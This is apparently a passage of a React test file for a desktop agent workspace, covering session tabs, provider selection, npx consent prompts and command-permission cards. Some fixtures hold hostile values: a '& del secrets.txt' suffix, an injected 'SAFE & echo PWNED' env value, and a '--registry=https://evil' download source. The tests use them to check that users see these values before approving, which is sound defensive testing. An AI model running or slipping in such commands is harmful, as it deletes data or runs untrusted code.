// @vitest-environment happy-dom

import { act } from "react";
import { createRoot } from "react-dom/client";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import type { PermissionRequest, Session } from "../../types/ipc";

vi.mock("@tauri-apps/plugin-dialog", () => ({
  // The recovery confirmation dialog; each test that needs a specific answer
  // overrides the resolved value.
  ask: vi.fn(async () => false),
}));

vi.mock("@tauri-apps/api/core", () => ({
  // Presence reporting starts with the Workspace mount; keep its sends
  // hermetic here (presence.test.ts covers the reporter itself).
  invoke: vi.fn(async () => undefined),
}));

vi.mock("../../lib/tauri", () => ({
  daemonStatus: vi.fn(async () => ({
    state: "connected",
    pid: 42,
    instanceId: "daemon-test",
    protocolVersion: 1,
    clients: 1,
    capabilities: ["typed_permissions"],
    message: null,
  })),
  sessionsList: vi.fn(),
  journalUsage: vi.fn(),
  sessionDelete: vi.fn(),
  reasonFromCause: vi.fn((cause: unknown) =>
    cause instanceof Error && cause.message ? cause.message : "the app did not answer",
  ),
  sessionCreate: vi.fn(),
  providersList: vi.fn(),
  sessionPresence: vi.fn(async () => undefined),
  daemonRestart: vi.fn(async () => undefined),
  sessionPermissionRespond: vi.fn(async () => undefined),
  createSessionStateChannel: vi.fn((onSnapshot: (snapshots: unknown[]) => void) => ({
    onSnapshot,
  })),
  sessionsWatch: vi.fn(async () => undefined),
  sessionsUnwatch: vi.fn(async () => undefined),
}));

vi.mock("../terminal/TerminalSurface", () => ({
  TerminalSurface: ({ sessionId }: { sessionId: string }) => (
    <div data-testid="terminal-surface">{sessionId}</div>
  ),
}));

vi.mock("./AgentChatSurface", () => ({
  AgentChatSurface: ({
    sessionId,
    onPermissionRequest,
    onPermissionResolved,
  }: {
    sessionId: string;
    onPermissionRequest?: (sessionId: string, request: PermissionRequest) => void;
    onPermissionResolved?: (sessionId: string, toolCallId: string) => void;
  }) => (
    <div data-testid="agent-chat-surface">
      {sessionId}
      <button
        type="button"
        data-testid="emit-permission-a"
        onClick={() =>
          onPermissionRequest?.(sessionId, {
            type: "permission_request",
            toolCallId: "tool-a",
            title: "Run command",
            command: "cmd.exe",
            args: ["/c", "echo", "alpha"],
            cwd: "C:\\alpha",
            options: [
              { optionId: "allow", name: "Allow once", kind: "allow_once" },
              { optionId: "deny", name: "Deny", kind: "reject_once" },
            ],
          })
        }
      />
      <button
        type="button"
        data-testid="emit-permission-b"
        onClick={() =>
          onPermissionRequest?.(sessionId, {
            type: "permission_request",
            toolCallId: "tool-b",
            title: "Run command",
            command: "ping.exe",
            args: ["-n", "1", "127.0.0.1"],
            cwd: "C:\\beta",
            options: [
              { optionId: "allow", name: "Allow once", kind: "allow_once" },
              { optionId: "deny", name: "Deny", kind: "reject_once" },
            ],
          })
        }
      />
      <button
        type="button"
        data-testid="emit-permission-resolved"
        onClick={() => onPermissionResolved?.(sessionId, "tool-a")}
      />
      <button
        type="button"
        data-testid="emit-permission-shared"
        onClick={() =>
          onPermissionRequest?.(sessionId, {
            type: "permission_request",
            toolCallId: "shared-tool",
            title: "Run command",
            command: `shared-${sessionId}`,
            cwd: `C:\\${sessionId}`,
            options: [
              { optionId: "allow", name: "Allow once", kind: "allow_once" },
              { optionId: "deny", name: "Deny", kind: "reject_once" },
            ],
          })
        }
      />
    </div>
  ),
}));

import {
  daemonRestart,
  daemonStatus,
  journalUsage,
  providersList,
  sessionCreate,
  sessionDelete,
  sessionPermissionRespond,
  sessionsList,
} from "../../lib/tauri";
import { ask } from "@tauri-apps/plugin-dialog";
import type { JournalUsage } from "../../types/ipc";
import { Workspace, WorkspacePermissionCard } from "./Workspace";

const terminal = (id: string, title: string): Session => ({
  id,
  workspaceId: null,
  kind: "terminal",
  title,
  state: { type: "live", generation: 1 },
  elapsedMs: 0,
});

const acpSession = (id: string, title: string): Session => ({
  ...terminal(id, title),
  kind: "acp",
});

const permissionRequest: PermissionRequest = {
  type: "permission_request",
  toolCallId: "tool-test",
  title: "Run command",
  command: "echo test",
  options: [
    { optionId: "allow", name: "Allow once", kind: "allow_once" },
    { optionId: "deny", name: "Deny", kind: "reject_once" },
  ],
};

const spawnPermissionRequest: PermissionRequest = {
  type: "permission_request",
  toolCallId: "tool-spawn",
  title: "Run command",
  command: "cmd.exe",
  args: ["/c", "echo", "gated"],
  cwd: "C:\\work\\tree",
  options: [
    { optionId: "allow", name: "Allow once", kind: "allow_once" },
    { optionId: "deny", name: "Deny", kind: "reject_once" },
  ],
};

const historyUsage: JournalUsage = {
  totalBytes: 32,
  sessionCount: 1,
  deletedByUser: 0,
  deletedByRetention: 0,
  unreclaimable: { bytesOver: 0, sessionsOver: 0, agedOut: 0 },
  limits: {
    snapshotEveryBytes: 65_536,
    sessionMaxBytes: 512,
    maxBytes: 1024,
    maxSessions: 10,
    maxAgeMs: 0,
  },
  perSession: [
    { id: "session-1", title: "Saved build history", kind: "terminal", bytes: 32, updatedAtMs: 0 },
  ],
};

function setSearchValue(input: HTMLInputElement, value: string) {
  const setter = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, "value")?.set;
  if (!setter) throw new Error("input value setter did not resolve");
  setter.call(input, value);
  input.dispatchEvent(new Event("input", { bubbles: true }));
}

describe("Workspace sessions", () => {
  let container: HTMLDivElement;
  let root: ReturnType<typeof createRoot>;

  beforeEach(() => {
    container = document.createElement("div");
    document.body.appendChild(container);
    vi.mocked(sessionsList).mockResolvedValue([terminal("session-1", "shell one")]);
    vi.mocked(sessionCreate).mockResolvedValue({
      ...terminal("session-2", "agent two"),
      kind: "acp",
    });
    vi.mocked(providersList).mockResolvedValue({ providers: [], unreadableDirs: 0 });
  });

  afterEach(async () => {
    await act(async () => root.unmount());
    container.remove();
    vi.clearAllMocks();
  });

  it("renders real session tabs, creates an ACP session, and never renders the permission card", async () => {
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    expect(container.textContent).toContain("shell one");
    expect(container.querySelector(".workspace-permission-card")).toBeNull();
    expect(container.querySelector("[data-testid=terminal-surface]")?.textContent).toBe(
      "session-1",
    );

    const add = container.querySelector<HTMLButtonElement>(".workspace-session-add");
    if (add === null) throw new Error("session add control did not render");
    await act(async () => add.click());

    expect(sessionCreate).toHaveBeenCalledWith(null, "acp");
    expect(container.textContent).toContain("agent two");
    expect(container.querySelector("[data-testid=agent-chat-surface]")?.textContent).toBe(
      "session-2",
    );
  });

  it("renders the create error as a dismissible alert while a session is selected", async () => {
    vi.mocked(sessionCreate).mockRejectedValue(new Error("Authentication required: test-reason"));
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const add = container.querySelector<HTMLButtonElement>(".workspace-session-add");
    if (add === null) throw new Error("session add control did not render");
    await act(async () => add.click());
    await act(async () => undefined);

    expect(container.querySelector("[data-testid=terminal-surface]")).not.toBeNull();
    const banner = container.querySelector('[role="alert"]');
    if (banner === null) throw new Error("error banner did not render");
    expect(banner.textContent).toContain("Authentication required: test-reason");
    expect(container.textContent).not.toContain("unreachable");

    const dismiss = banner.querySelector<HTMLButtonElement>('[aria-label="Dismiss error"]');
    if (dismiss === null) throw new Error("dismiss control did not render");
    await act(async () => dismiss.click());
    await act(async () => undefined);

    expect(container.querySelector('[role="alert"]')).toBeNull();
  });

  it("starts an ACP session when a new workspace is added", async () => {
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-new-row");
    if (newWorkspace === null) throw new Error("new workspace control did not render");
    await act(async () => newWorkspace.click());

    expect(sessionCreate).toHaveBeenCalledWith(null, "acp");
    expect(container.querySelector("[data-testid=agent-chat-surface]")).not.toBeNull();
  });

  const grokProvider = {
    id: "grok",
    executable: "grok.exe",
    acpAvailable: true,
    authentication: "unknown" as const,
    protocol: "acp",
  };
  const claudeProvider = {
    id: "claude",
    executable: "claude.exe",
    acpAvailable: false,
    authentication: "unknown" as const,
    protocol: "stream-json",
  };

  it("lists chat-capable providers in a popover and creates claude when chosen", async () => {
    vi.mocked(providersList).mockResolvedValue({
      providers: [grokProvider, claudeProvider],
      unreadableDirs: 0,
    });
    vi.mocked(sessionCreate).mockResolvedValue({
      ...terminal("session-claude", "Agent"),
      kind: "claude",
    });
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-new-row");
    if (newWorkspace === null) throw new Error("new workspace control did not render");
    await act(async () => newWorkspace.click());
    await act(async () => undefined);

    expect(sessionCreate).not.toHaveBeenCalled();
    const menu = container.querySelector('[aria-label="Choose agent"]');
    if (menu === null) throw new Error("provider popover did not render");
    expect(menu.textContent).toContain("grok");
    expect(menu.textContent).toContain("claude");

    const claudeOption = Array.from(menu.querySelectorAll("button")).find(
      (button) => button.textContent === "claude",
    );
    if (claudeOption === undefined) throw new Error("claude option did not render");
    await act(async () => claudeOption.click());
    await act(async () => undefined);

    expect(sessionCreate).toHaveBeenCalledWith(null, "claude");
    expect(container.querySelector('[aria-label="Choose agent"]')).toBeNull();
  });

  it("creates immediately with the only chat-capable provider", async () => {
    vi.mocked(providersList).mockResolvedValue({
      providers: [grokProvider],
      unreadableDirs: 0,
    });
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-new-row");
    if (newWorkspace === null) throw new Error("new workspace control did not render");
    await act(async () => newWorkspace.click());
    await act(async () => undefined);

    expect(container.querySelector('[aria-label="Choose agent"]')).toBeNull();
    expect(sessionCreate).toHaveBeenCalledWith(null, "acp", "grok");
  });

  it("creates an ACP session with no provider when no chat-capable CLI is installed", async () => {
    vi.mocked(providersList).mockResolvedValue({
      providers: [
        {
          id: "codex",
          executable: "codex.exe",
          acpAvailable: false,
          authentication: "unknown",
          protocol: null,
        },
      ],
      unreadableDirs: 0,
    });
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-new-row");
    if (newWorkspace === null) throw new Error("new workspace control did not render");
    await act(async () => newWorkspace.click());
    await act(async () => undefined);

    expect(container.querySelector('[aria-label="Choose agent"]')).toBeNull();
    expect(sessionCreate).toHaveBeenCalledWith(null, "acp");
  });

  it("dismisses the provider popover on Escape without creating", async () => {
    vi.mocked(providersList).mockResolvedValue({
      providers: [grokProvider, claudeProvider],
      unreadableDirs: 0,
    });
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-new-row");
    if (newWorkspace === null) throw new Error("new workspace control did not render");
    await act(async () => newWorkspace.click());
    await act(async () => undefined);
    expect(container.querySelector('[aria-label="Choose agent"]')).not.toBeNull();

    await act(async () => {
      window.dispatchEvent(new KeyboardEvent("keydown", { key: "Escape", bubbles: true }));
    });

    expect(container.querySelector('[aria-label="Choose agent"]')).toBeNull();
    expect(sessionCreate).not.toHaveBeenCalled();
  });

  it("adds one workspace when New workspace is clicked twice before providersList resolves", async () => {
    let release:
      | ((value: { providers: (typeof grokProvider)[]; unreadableDirs: number }) => void)
      | undefined;
    const pending = new Promise<{ providers: (typeof grokProvider)[]; unreadableDirs: number }>(
      (resolve) => {
        release = resolve;
      },
    );
    vi.mocked(providersList).mockImplementation(() => pending);
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-new-row");
    if (newWorkspace === null) throw new Error("new workspace control did not render");
    const rowsBefore = container.querySelectorAll(".workspace-row").length;

    await act(async () => {
      newWorkspace.click();
      newWorkspace.click();
    });
    expect(container.querySelectorAll(".workspace-row").length).toBe(rowsBefore);
    expect(sessionCreate).not.toHaveBeenCalled();

    await act(async () => {
      if (release === undefined) throw new Error("providersList was not called");
      release({ providers: [grokProvider], unreadableDirs: 0 });
    });
    await act(async () => undefined);

    expect(container.querySelectorAll(".workspace-row").length).toBe(rowsBefore + 1);
    expect(sessionCreate).toHaveBeenCalledTimes(1);
    expect(sessionCreate).toHaveBeenCalledWith(null, "acp", "grok");
  });

  it("dismisses the provider popover on outside mousedown without creating", async () => {
    vi.mocked(providersList).mockResolvedValue({
      providers: [grokProvider, claudeProvider],
      unreadableDirs: 0,
    });
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-new-row");
    if (newWorkspace === null) throw new Error("new workspace control did not render");
    await act(async () => newWorkspace.click());
    await act(async () => undefined);
    expect(container.querySelector('[aria-label="Choose agent"]')).not.toBeNull();

    await act(async () => {
      document.body.dispatchEvent(new MouseEvent("mousedown", { bubbles: true }));
    });

    expect(container.querySelector('[aria-label="Choose agent"]')).toBeNull();
    expect(sessionCreate).not.toHaveBeenCalled();
  });

  it("opens History from the left sidebar", async () => {
    vi.mocked(journalUsage).mockResolvedValue(historyUsage);
    vi.mocked(sessionsList).mockResolvedValue([
      {
        ...terminal("session-1", "shell one"),
        workspaceId: "workspace-rust",
        state: {
          type: "ended",
          generation: 1,
          code: 0,
          integrity: { kind: "complete" },
        },
      },
    ]);
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);
    const history = Array.from(container.querySelectorAll<HTMLButtonElement>("button")).find(
      (button) => button.textContent?.includes("History"),
    );
    if (!history) throw new Error("History button did not render");
    expect(history.getAttribute("aria-controls")).toBe("workspace-history-panel");
    await act(async () => history.click());
    await act(async () => undefined);
    expect(container.querySelector("#workspace-history-panel")).not.toBeNull();
    expect(container.textContent).toContain("Saved build history");
    expect(container.textContent).toContain("workspace-rust");
    expect(sessionDelete).not.toHaveBeenCalled();
  });

  it("keeps workspace and History searches independent across toggles", async () => {
    vi.mocked(journalUsage).mockResolvedValue(historyUsage);
    vi.mocked(sessionsList).mockResolvedValue([]);
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const search = container.querySelector<HTMLInputElement>('input[placeholder="Search"]');
    if (!search) throw new Error("search input did not render");
    const historyToggle = container.querySelector<HTMLButtonElement>(".workspace-history-button");
    if (!historyToggle) throw new Error("History toggle did not render");

    await act(async () => historyToggle.click());
    await act(async () => undefined);
    await act(async () => {
      setSearchValue(search, "history-only");
    });
    expect(search.value).toBe("history-only");
    await act(async () => historyToggle.click());
    expect(container.textContent).toContain("rust-core");

    await act(async () => {
      setSearchValue(search, "rust");
    });
    expect(search.value).toBe("rust");
    await act(async () => historyToggle.click());
    await act(async () => {
      setSearchValue(search, "Saved");
    });
    await act(async () => historyToggle.click());

    expect(search.value).toBe("rust");
    expect(container.textContent).toContain("rust-core");
    expect(container.textContent).not.toContain("main");
  });

  it("does not render a permission card before typed_permissions is negotiated", async () => {
    root = createRoot(container);
    await act(async () => {
      root.render(
        <WorkspacePermissionCard
          sessionId="session-1"
          request={permissionRequest}
          capabilities={[]}
        />,
      );
    });

    expect(container.querySelector(".workspace-permission-card")).toBeNull();
    expect(sessionPermissionRespond).not.toHaveBeenCalled();
  });

  it("sends one real allow-once response for a negotiated permission card", async () => {
    root = createRoot(container);
    await act(async () => {
      root.render(
        <WorkspacePermissionCard
          sessionId="session-1"
          request={permissionRequest}
          capabilities={["typed_permissions"]}
        />,
      );
    });

    const allow = container.querySelector<HTMLButtonElement>(".workspace-primary-action");
    if (allow === null) throw new Error("permission allow control did not render");
    await act(async () => {
      allow.click();
      allow.click();
    });

    expect(sessionPermissionRespond).toHaveBeenCalledTimes(1);
    expect(sessionPermissionRespond).toHaveBeenCalledWith("session-1", "tool-test", "allow_once");
  });

  it("shows the command, args, and cwd that will be spawned", async () => {
    root = createRoot(container);
    await act(async () => {
      root.render(
        <WorkspacePermissionCard
          sessionId="session-1"
          request={spawnPermissionRequest}
          capabilities={["typed_permissions"]}
        />,
      );
    });

    const text = container.textContent ?? "";
    expect(text).toContain("cmd.exe");
    expect(text).toContain("/c");
    expect(text).toContain("echo");
    expect(text).toContain("gated");
    expect(text).toContain("C:\\work\\tree");
  });

  it("shows permission requests FIFO and advances after a response", async () => {
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const add = container.querySelector<HTMLButtonElement>(".workspace-session-add");
    if (add === null) throw new Error("session add control did not render");
    await act(async () => add.click());
    await act(async () => undefined);

    const emitA = container.querySelector<HTMLButtonElement>("[data-testid=emit-permission-a]");
    const emitB = container.querySelector<HTMLButtonElement>("[data-testid=emit-permission-b]");
    if (emitA === null || emitB === null) throw new Error("permission emitters did not render");
    await act(async () => emitA.click());
    await act(async () => emitB.click());

    const card = container.querySelector(".workspace-permission-card");
    if (card === null) throw new Error("permission card did not render");
    expect(card.textContent).toContain("cmd.exe");
    expect(card.textContent).toContain("alpha");
    expect(card.textContent).not.toContain("ping.exe");

    const allow = container.querySelector<HTMLButtonElement>(".workspace-primary-action");
    if (allow === null) throw new Error("permission allow control did not render");
    await act(async () => allow.click());
    await act(async () => undefined);

    const next = container.querySelector(".workspace-permission-card");
    if (next === null) throw new Error("second permission card did not render");
    expect(next.textContent).toContain("ping.exe");
    expect(next.textContent).toContain("C:\\beta");
    expect(sessionPermissionRespond).toHaveBeenCalledWith("session-2", "tool-a", "allow_once");
  });

  it("quotes args that contain spaces so they are not split visually", async () => {
    root = createRoot(container);
    await act(async () => {
      root.render(
        <WorkspacePermissionCard
          sessionId="session-1"
          request={{
            ...spawnPermissionRequest,
            args: ["hello world"],
          }}
          capabilities={["typed_permissions"]}
        />,
      );
    });

    const command = container.querySelector(".workspace-permission-command")?.textContent ?? "";
    expect(command).toContain('"hello world"');
    expect(command).not.toBe("cmd.exe hello world");
  });

  it("shows the selected session's permission when another session's request is at the head", async () => {
    vi.mocked(sessionsList).mockResolvedValue([
      acpSession("session-a", "agent a"),
      acpSession("session-b", "agent b"),
    ]);
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const emitA = container.querySelector<HTMLButtonElement>("[data-testid=emit-permission-a]");
    if (emitA === null) throw new Error("permission emitter A did not render");
    await act(async () => emitA.click());
    expect(container.querySelector(".workspace-permission-card")?.textContent).toContain("alpha");

    const tabB = [...container.querySelectorAll<HTMLButtonElement>(".workspace-session-tab")].find(
      (tab) => tab.textContent?.includes("agent b"),
    );
    if (tabB === undefined) throw new Error("session B tab did not render");
    await act(async () => tabB.click());
    await act(async () => undefined);

    const emitB = container.querySelector<HTMLButtonElement>("[data-testid=emit-permission-b]");
    if (emitB === null) throw new Error("permission emitter B did not render");
    await act(async () => emitB.click());

    const card = container.querySelector(".workspace-permission-card");
    if (card === null) throw new Error("selected session B's permission card did not render");
    expect(card.textContent).toContain("ping.exe");
    expect(card.textContent).not.toContain("alpha");
  });

  it("shows the full command including a long suffix the user must see before allowing", async () => {
    const suffix = "& del secrets.txt";
    root = createRoot(container);
    await act(async () => {
      root.render(
        <WorkspacePermissionCard
          sessionId="session-1"
          request={{
            ...spawnPermissionRequest,
            command: `${"echo ".padEnd(2100, "x")}${suffix}`,
            args: undefined,
          }}
          capabilities={["typed_permissions"]}
        />,
      );
    });

    expect(container.textContent).toContain(suffix);
    expect(container.textContent).not.toContain("…");
  });

  it("lists env name=value on the permission card when present", async () => {
    root = createRoot(container);
    await act(async () => {
      root.render(
        <WorkspacePermissionCard
          sessionId="session-1"
          request={{
            ...spawnPermissionRequest,
            env: [{ name: "DB_GATE", value: "SAFE & echo PWNED" }],
          }}
          capabilities={["typed_permissions"]}
        />,
      );
    });

    const env = container.querySelector(".workspace-permission-env")?.textContent ?? "";
    expect(env).toContain("DB_GATE=SAFE & echo PWNED");
  });

  it("drops the card when the backend resolves the permission without a UI click", async () => {
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const add = container.querySelector<HTMLButtonElement>(".workspace-session-add");
    if (add === null) throw new Error("session add control did not render");
    await act(async () => add.click());
    await act(async () => undefined);

    const emit = container.querySelector<HTMLButtonElement>("[data-testid=emit-permission-a]");
    const resolved = container.querySelector<HTMLButtonElement>(
      "[data-testid=emit-permission-resolved]",
    );
    if (emit === null || resolved === null) throw new Error("permission emitters did not render");
    await act(async () => emit.click());
    expect(container.querySelector(".workspace-permission-card")).not.toBeNull();

    await act(async () => resolved.click());
    expect(container.querySelector(".workspace-permission-card")).toBeNull();
    expect(sessionPermissionRespond).not.toHaveBeenCalled();
  });

  it("keeps the other session's card when two sessions share a toolCallId", async () => {
    vi.mocked(sessionsList).mockResolvedValue([
      acpSession("session-a", "agent a"),
      acpSession("session-b", "agent b"),
    ]);
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const emitShared = container.querySelector<HTMLButtonElement>(
      "[data-testid=emit-permission-shared]",
    );
    if (emitShared === null) throw new Error("shared permission emitter did not render");
    await act(async () => emitShared.click());
    expect(container.querySelector(".workspace-permission-card")?.textContent).toContain(
      "shared-session-a",
    );

    const tabB = [...container.querySelectorAll<HTMLButtonElement>(".workspace-session-tab")].find(
      (tab) => tab.textContent?.includes("agent b"),
    );
    if (tabB === undefined) throw new Error("session B tab did not render");
    await act(async () => tabB.click());
    await act(async () => undefined);

    const emitB = container.querySelector<HTMLButtonElement>(
      "[data-testid=emit-permission-shared]",
    );
    if (emitB === null) throw new Error("session B shared emitter did not render");
    await act(async () => emitB.click());
    expect(container.querySelector(".workspace-permission-card")?.textContent).toContain(
      "shared-session-b",
    );

    const tabA = [...container.querySelectorAll<HTMLButtonElement>(".workspace-session-tab")].find(
      (tab) => tab.textContent?.includes("agent a"),
    );
    if (tabA === undefined) throw new Error("session A tab did not render");
    await act(async () => tabA.click());
    await act(async () => undefined);

    const allow = container.querySelector<HTMLButtonElement>(".workspace-primary-action");
    if (allow === null) throw new Error("permission allow control did not render");
    await act(async () => allow.click());
    await act(async () => undefined);

    expect(container.querySelector(".workspace-permission-card")).toBeNull();
    expect(sessionPermissionRespond).toHaveBeenCalledWith("session-a", "shared-tool", "allow_once");

    await act(async () => tabB.click());
    await act(async () => undefined);
    const cardB = container.querySelector(".workspace-permission-card");
    if (cardB === null) throw new Error("session B's card vanished after resolving A");
    expect(cardB.textContent).toContain("shared-session-b");
    expect(cardB.textContent).not.toContain("shared-session-a");
  });

  const npxProvider = {
    id: "codex-acp",
    executable: "@agentclientprotocol/codex-acp@1.10.0",
    acpAvailable: true,
    authentication: "unknown" as const,
    protocol: "acp" as const,
    origin: "npx-wrapper" as const,
    launchArgs: ["--registry=https://evil"],
  };

  it("shows consent panel when picking an npx provider and does not call create", async () => {
    vi.mocked(providersList).mockResolvedValue({
      providers: [grokProvider, npxProvider],
      unreadableDirs: 0,
    });
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-new-row");
    if (newWorkspace === null) throw new Error("new workspace control did not render");
    await act(async () => newWorkspace.click());
    await act(async () => undefined);

    const codexOption = Array.from(
      container.querySelectorAll<HTMLButtonElement>(".workspace-surface-option"),
    ).find((button) => button.textContent?.includes("codex-acp"));
    if (codexOption === undefined) throw new Error("codex-acp option did not render");
    await act(async () => codexOption.click());
    await act(async () => undefined);

    expect(container.querySelector('[aria-label="Confirm agent"]')).not.toBeNull();
    expect(container.textContent).toContain("@agentclientprotocol/codex-acp@1.10.0");
    expect(container.textContent).toContain(
      "npx -y @agentclientprotocol/codex-acp@1.10.0 --registry=https://evil",
    );
    expect(container.textContent).toContain("npx will download and run third-party code");
    expect(sessionCreate).not.toHaveBeenCalled();
  });

  it("Confirm on consent panel calls create exactly once", async () => {
    vi.mocked(providersList).mockResolvedValue({
      providers: [grokProvider, npxProvider],
      unreadableDirs: 0,
    });
    vi.mocked(sessionCreate).mockResolvedValue({
      ...terminal("session-codex", "Agent"),
      kind: "acp",
    });
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-new-row");
    if (newWorkspace === null) throw new Error("new workspace control did not render");
    await act(async () => newWorkspace.click());
    await act(async () => undefined);

    const codexOption = Array.from(
      container.querySelectorAll<HTMLButtonElement>(".workspace-surface-option"),
    ).find((button) => button.textContent?.includes("codex-acp"));
    if (codexOption === undefined) throw new Error("codex-acp option did not render");
    await act(async () => codexOption.click());
    await act(async () => undefined);

    const confirm = container.querySelector<HTMLButtonElement>(".workspace-primary-action");
    if (confirm === null) throw new Error("Confirm button did not render");
    await act(async () => confirm.click());
    await act(async () => undefined);

    expect(sessionCreate).toHaveBeenCalledTimes(1);
    expect(sessionCreate).toHaveBeenCalledWith(null, "acp", "codex-acp");
    expect(container.querySelector('[aria-label="Confirm agent"]')).toBeNull();
    expect(container.querySelector('[aria-label="Choose agent"]')).toBeNull();
  });

  it("Cancel on consent panel returns to option list without creating", async () => {
    vi.mocked(providersList).mockResolvedValue({
      providers: [grokProvider, npxProvider],
      unreadableDirs: 0,
    });
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-new-row");
    if (newWorkspace === null) throw new Error("new workspace control did not render");
    await act(async () => newWorkspace.click());
    await act(async () => undefined);

    const codexOption = Array.from(
      container.querySelectorAll<HTMLButtonElement>(".workspace-surface-option"),
    ).find((button) => button.textContent?.includes("codex-acp"));
    if (codexOption === undefined) throw new Error("codex-acp option did not render");
    await act(async () => codexOption.click());
    await act(async () => undefined);

    expect(container.querySelector('[aria-label="Confirm agent"]')).not.toBeNull();
    const cancel = Array.from(
      container.querySelectorAll<HTMLButtonElement>(".workspace-secondary-action"),
    ).find((button) => button.textContent === "Cancel");
    if (cancel === undefined) throw new Error("Cancel button did not render");
    await act(async () => cancel.click());
    await act(async () => undefined);

    expect(container.querySelector('[aria-label="Confirm agent"]')).toBeNull();
    expect(container.querySelector('[aria-label="Choose agent"]')).not.toBeNull();
    expect(sessionCreate).not.toHaveBeenCalled();
  });

  it("Escape on consent panel returns to option list without creating", async () => {
    vi.mocked(providersList).mockResolvedValue({
      providers: [grokProvider, npxProvider],
      unreadableDirs: 0,
    });
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-new-row");
    if (newWorkspace === null) throw new Error("new workspace control did not render");
    await act(async () => newWorkspace.click());
    await act(async () => undefined);

    const codexOption = Array.from(
      container.querySelectorAll<HTMLButtonElement>(".workspace-surface-option"),
    ).find((button) => button.textContent?.includes("codex-acp"));
    if (codexOption === undefined) throw new Error("codex-acp option did not render");
    await act(async () => codexOption.click());
    await act(async () => undefined);

    expect(container.querySelector('[aria-label="Confirm agent"]')).not.toBeNull();

    await act(async () => {
      window.dispatchEvent(new KeyboardEvent("keydown", { key: "Escape", bubbles: true }));
    });

    expect(container.querySelector('[aria-label="Confirm agent"]')).toBeNull();
    expect(container.querySelector('[aria-label="Choose agent"]')).not.toBeNull();
    expect(sessionCreate).not.toHaveBeenCalled();
  });

  it("double-click on Confirm creates only once", async () => {
    vi.mocked(providersList).mockResolvedValue({
      providers: [grokProvider, npxProvider],
      unreadableDirs: 0,
    });
    vi.mocked(sessionCreate).mockResolvedValue({
      ...terminal("session-codex", "Agent"),
      kind: "acp",
    });
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-new-row");
    if (newWorkspace === null) throw new Error("new workspace control did not render");
    await act(async () => newWorkspace.click());
    await act(async () => undefined);

    const codexOption = Array.from(
      container.querySelectorAll<HTMLButtonElement>(".workspace-surface-option"),
    ).find((button) => button.textContent?.includes("codex-acp"));
    if (codexOption === undefined) throw new Error("codex-acp option did not render");
    await act(async () => codexOption.click());
    await act(async () => undefined);

    const confirm = container.querySelector<HTMLButtonElement>(".workspace-primary-action");
    if (confirm === null) throw new Error("Confirm button did not render");
    const rowsBefore = container.querySelectorAll(".workspace-row").length;
    await act(async () => {
      confirm.click();
      confirm.click();
    });
    await act(async () => undefined);

    expect(sessionCreate).toHaveBeenCalledTimes(1);
    expect(sessionCreate).toHaveBeenCalledWith(null, "acp", "codex-acp");
    expect(container.querySelectorAll(".workspace-row").length).toBe(rowsBefore + 1);
  });

  describe("session attention badges", () => {
    const attentionSession = (
      id: string,
      title: string,
      reason: "finished" | "error" | "permission",
    ): Session => ({
      ...acpSession(id, title),
      attention: { reason, atMs: 1_000 },
    });

    it("renders an attention badge on tabs that carry attention and none on tabs without", async () => {
      vi.mocked(sessionsList).mockResolvedValue([
        attentionSession("session-a", "agent finished", "finished"),
        attentionSession("session-b", "agent error", "error"),
        attentionSession("session-c", "agent permission", "permission"),
        acpSession("session-d", "agent quiet"),
      ]);
      root = createRoot(container);
      await act(async () => {
        root.render(<Workspace />);
      });
      await act(async () => undefined);

      const findTab = (title: string): HTMLButtonElement => {
        const tab = [
          ...container.querySelectorAll<HTMLButtonElement>(".workspace-session-tab"),
        ].find((candidate) => candidate.textContent?.includes(title));
        if (tab === undefined) throw new Error(`tab for ${title} did not render`);
        return tab;
      };

      expect(findTab("agent finished").querySelector(".workspace-tab-attention")?.textContent).toBe(
        "finished",
      );
      expect(findTab("agent error").querySelector(".workspace-tab-attention")?.textContent).toBe(
        "error",
      );
      expect(
        findTab("agent permission").querySelector(".workspace-tab-attention")?.textContent,
      ).toBe("needs approval");
